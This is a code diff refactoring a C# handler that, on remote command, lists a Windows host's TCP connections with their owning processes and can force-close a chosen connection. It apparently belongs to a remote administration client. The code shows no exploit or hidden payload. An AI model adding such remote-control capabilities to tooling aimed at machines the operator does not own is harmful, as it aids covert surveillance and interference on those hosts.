@@ -12,50 +12,86 @@ namespace Pulsar.Client.Messages
 {
     public class TcpConnectionsHandler : IMessageProcessor
     {
-        public bool CanExecute(IMessage message) => message is GetConnections ||
-                                                    message is DoCloseConnection;
+        // Local safe constants
+        private const int AF_INET = 2;
+        private const int TCP_TABLE_OWNER_PID_ALL = 5;
 
-        public bool CanExecuteFrom(ISender sender) => true;
+        // Local safe P/Invoke (NO uints = NO implicit conversion errors)
+        [DllImport("iphlpapi.dll", SetLastError = true)]
+        private static extern int GetExtendedTcpTable(
+            IntPtr pTcpTable,
+            ref int pdwSize,
+            bool bOrder,
+            int ipVersion,
+            int tableClass,
+            int reserved);
+
+        public bool CanExecute(IMessage message)
+        {
+            return (message is GetConnections) || (message is DoCloseConnection);
+        }
+
+        public bool CanExecuteFrom(ISender sender)
+        {
+            return true;
+        }
 
         public void Execute(ISender sender, IMessage message)
         {
-            switch (message)
+            var msgGet = message as GetConnections;
+            if (msgGet != null)
             {
-                case GetConnections msg:
-                    Execute(sender, msg);
-                    break;
-                case DoCloseConnection msg:
-                    Execute(sender, msg);
-                    break;
+                Execute(sender, msgGet);
+                return;
+            }
+
+            var msgClose = message as DoCloseConnection;
+            if (msgClose != null)
+            {
+                Execute(sender, msgClose);
+                return;
             }
         }
 
+        // =====================================================================
+        //  GET CONNECTIONS
+        // =====================================================================
         private void Execute(ISender client, GetConnections message)
         {
             var table = GetTable();
+
+            if (table == null || table.Length == 0)
+            {
+                client.Send(new GetConnectionsResponse { Connections = new TcpConnection[0] });
+                return;
+            }
 
             var connections = new TcpConnection[table.Length];
 
             for (int i = 0; i < table.Length; i++)
             {
                 string processName;
+
                 try
                 {
-                    var p = System.Diagnostics.Process.GetProcessById((int)table[i].owningPid);
+                    System.Diagnostics.Process p =
+                        System.Diagnostics.Process.GetProcessById((int)table[i].owningPid);
+
                     processName = p.ProcessName;
+                    p.Dispose();
                 }
                 catch
                 {
-                    processName = $"PID: {table[i].owningPid}";
+                    processName = "PID: " + table[i].owningPid;
                 }
 
                 connections[i] = new TcpConnection
                 {
                     ProcessName = processName,
                     LocalAddress = table[i].LocalAddress.ToString(),
-                    LocalPort = table[i].LocalPort,
+                    LocalPort = (ushort)table[i].LocalPort,
                     RemoteAddress = table[i].RemoteAddress.ToString(),
-                    RemotePort = table[i].RemotePort,
+                    RemotePort = (ushort)table[i].RemotePort,
                     State = (ConnectionState)table[i].state
                 };
             }
@@ -63,57 +99,108 @@ namespace Pulsar.Client.Messages
             client.Send(new GetConnectionsResponse { Connections = connections });
         }
 
+        // =====================================================================
+        //  CLOSE CONNECTION
+        // =====================================================================
         private void Execute(ISender client, DoCloseConnection message)
         {
             var table = GetTable();
+            if (table == null)
+                return;
 
-            for (var i = 0; i < table.Length; i++)
+            for (int i = 0; i < table.Length; i++)
             {
-                //search for connection
                 if (message.LocalAddress == table[i].LocalAddress.ToString() &&
-                    message.LocalPort == table[i].LocalPort &&
+                    message.LocalPort == (ushort)table[i].LocalPort &&
                     message.RemoteAddress == table[i].RemoteAddress.ToString() &&
-                    message.RemotePort == table[i].RemotePort)
+                    message.RemotePort == (ushort)table[i].RemotePort)
                 {
-                    // it will close the connection only if client run as admin
-                    table[i].state = (byte) ConnectionState.Delete_TCB;
-                    var ptr = Marshal.AllocCoTaskMem(Marshal.SizeOf(table[i]));
-                    Marshal.StructureToPtr(table[i], ptr, false);
-                    NativeMethods.SetTcpEntry(ptr);
+                    table[i].state = (byte)ConnectionState.Delete_TCB;
+
+                    IntPtr ptr = IntPtr.Zero;
+
+                    try
+                    {
+                        int size = Marshal.SizeOf(typeof(NativeMethods.MibTcprowOwnerPid));
+                        ptr = Marshal.AllocCoTaskMem(size);
+                        Marshal.StructureToPtr(table[i], ptr, false);
+                        NativeMethods.SetTcpEntry(ptr);
+                    }
+                    finally
+                    {
+                        if (ptr != IntPtr.Zero)
+                            Marshal.FreeCoTaskMem(ptr);
+                    }
+
                     Execute(client, new GetConnections());
                     return;
                 }
             }
         }
 
+        // =====================================================================
+        //  GET TABLE (safe, stable, C# 7.3 compatible)
+        // =====================================================================
         private NativeMethods.MibTcprowOwnerPid[] GetTable()
         {
-            NativeMethods.MibTcprowOwnerPid[] tTable;
-            var afInet = 2;
-            var buffSize = 0;
-            // retrieve correct pTcpTable size
-            NativeMethods.GetExtendedTcpTable(IntPtr.Zero, ref buffSize, true, afInet, NativeMethods.TcpTableClass.TcpTableOwnerPidAll);
-            var buffTable = Marshal.AllocHGlobal(buffSize);
+            int buffSize = 0;
+
+            // First call: get required buffer size
+            GetExtendedTcpTable(
+                IntPtr.Zero,
+                ref buffSize,
+                true,
+                AF_INET,
+                TCP_TABLE_OWNER_PID_ALL,
+                0);
+
+            if (buffSize <= 0)
+                return new NativeMethods.MibTcprowOwnerPid[0];
+
+            IntPtr buffTable = Marshal.AllocHGlobal(buffSize);
+
             try
             {
-                var ret = NativeMethods.GetExtendedTcpTable(buffTable, ref buffSize, true, afInet, NativeMethods.TcpTableClass.TcpTableOwnerPidAll);
+                // Second call: retrieve table
+                int ret = GetExtendedTcpTable(
+                    buffTable,
+                    ref buffSize,
+                    true,
+                    AF_INET,
+                    TCP_TABLE_OWNER_PID_ALL,
+                    0);
+
                 if (ret != 0)
-                    return null;
-                var tab = (NativeMethods.MibTcptableOwnerPid)Marshal.PtrToStructure(buffTable, typeof(NativeMethods.MibTcptableOwnerPid));
-                var rowPtr = (IntPtr)((long)buffTable + Marshal.SizeOf(tab.dwNumEntries));
-                tTable = new NativeMethods.MibTcprowOwnerPid[tab.dwNumEntries];
-                for (var i = 0; i < tab.dwNumEntries; i++)
+                    return new NativeMethods.MibTcprowOwnerPid[0];
+
+                // Read header
+                NativeMethods.MibTcptableOwnerPid tab =
+                    (NativeMethods.MibTcptableOwnerPid)Marshal.PtrToStructure(
+                        buffTable, typeof(NativeMethods.MibTcptableOwnerPid));
+
+                int count = (int)tab.dwNumEntries;
+                var rows = new NativeMethods.MibTcprowOwnerPid[count];
+
+                // Skip dwNumEntries (sizeof(uint) = 4 bytes)
+                IntPtr rowPtr = new IntPtr(buffTable.ToInt64() + 4);
+
+                int rowSize = Marshal.SizeOf(typeof(NativeMethods.MibTcprowOwnerPid));
+
+                for (int i = 0; i < count; i++)
                 {
-                    var tcpRow = (NativeMethods.MibTcprowOwnerPid)Marshal.PtrToStructure(rowPtr, typeof(NativeMethods.MibTcprowOwnerPid));
-                    tTable[i] = tcpRow;
-                    rowPtr = (IntPtr)((long)rowPtr + Marshal.SizeOf(tcpRow));
+                    rows[i] =
+                        (NativeMethods.MibTcprowOwnerPid)Marshal.PtrToStructure(
+                            rowPtr, typeof(NativeMethods.MibTcprowOwnerPid));
+
+                    rowPtr = new IntPtr(rowPtr.ToInt64() + rowSize);
                 }
+
+                return rows;
             }
             finally
             {
                 Marshal.FreeHGlobal(buffTable);
             }
-            return tTable;
         }
     }
 }
